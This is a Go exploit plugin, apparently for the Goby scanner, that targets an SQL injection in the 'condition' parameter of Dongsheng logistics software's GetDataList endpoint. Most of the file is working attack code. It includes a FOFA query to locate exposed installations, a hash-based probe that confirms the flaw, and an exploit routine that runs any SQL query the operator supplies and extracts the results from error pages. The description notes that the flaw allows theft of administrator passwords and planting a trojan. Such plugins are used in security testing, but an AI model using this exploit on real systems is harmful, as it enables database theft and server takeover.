package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dongsheng logistics software /TruckMng/MsWlDriver/GetDataList file condition parameter SQL injection vulnerability",
    "Description": "<p>Dongsheng logistics software is a logistics management software that integrates order management, warehouse management, transportation management and other functions.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "东胜物流软件",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2023-03-06",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\"",
    "GobyQuery": "body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=DrvCode%20like%20%27%1%%27%20and%20DrvName%20like%20%27%1%%27%20and%20JzNo%20like%20%27%1%%27%20and%20OrgCode%20like%20%27%1%%27%20AND%204045%20IN%20(select%20sys.fn_sqlvarbasetostr(hashbytes(%27MD5%27,%275%27)))--%20IkbK&page=1",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e4da3b7fbbce2345d7772b0674a318d5",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=DrvCode+like+'%251%25'+and+DrvName+like+'%251%25'+and+JzNo+like+'%251%25'+and+OrgCode+like+'%251%25'+AND+4045+IN+(select+{{{sql}}})--+IkbK&page=1",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<title>([\\w\\W]+)</title>"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /TruckMng/MsWlDriver/GetDataList 文件 condition 参数 SQL 注入漏洞",
            "Product": "东胜物流软件",
            "Description": "<p>东胜物流软件是一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng logistics software /TruckMng/MsWlDriver/GetDataList file condition parameter SQL injection vulnerability",
            "Product": "东胜物流软件",
            "Description": "<p>Dongsheng logistics software is a logistics management software that integrates order management, warehouse management, transportation management and other functions.<br></p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-06",
    "PocId": "10834"
}`
	sendSqlInjectionParamsDKWQOPIUE := func(hostInfo *httpclient.FixUrl, sqlPayload string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=" + sqlPayload + "--%20&page=1")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			response, err := sendSqlInjectionParamsDKWQOPIUE(hostInfo, url.QueryEscape("123123 IN (select sys.fn_sqlvarbasetostr(hashbytes('MD5','5')))"))
			if err != nil {
				return false
			}
			return response.StatusCode == 500 && strings.Contains(response.Utf8Html, "0xe4da3b7fbbce2345d7772b0674a318d5")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {

				response, err := sendSqlInjectionParamsDKWQOPIUE(expResult.HostInfo, "123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(32)%2b("+url.QueryEscape(sql)+")%2bCHAR(32)%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113))")
				if err != nil {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				if response.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				re := regexp.MustCompile(`qxpqq(.*?)qzkqq`)
				matches := re.FindStringSubmatch(response.Utf8Html)
				if len(matches) >= 2 {
					matchedText := matches[1]
					expResult.Output = matchedText
				}
			} else if attackType == "sqlpoint" {
				response, err := sendSqlInjectionParamsDKWQOPIUE(expResult.HostInfo, url.QueryEscape("123123 IN (select sys.fn_sqlvarbasetostr(hashbytes('MD5','5')))"))
				if err != nil {
					expResult.Success = false
					expResult.Output = "不存在注入点"
					return expResult
				}
				if response.StatusCode != 500 || !strings.Contains(response.Utf8Html, "0xe4da3b7fbbce2345d7772b0674a318d5") {
					expResult.Success = false
					expResult.Output = "不存在注入点"
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=123123%20IN%20(select%20sys.fn_sqlvarbasetostr(hashbytes('MD5'%2c'5')))--%20&page=1 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

`
			}
			return expResult
		},
	))
}
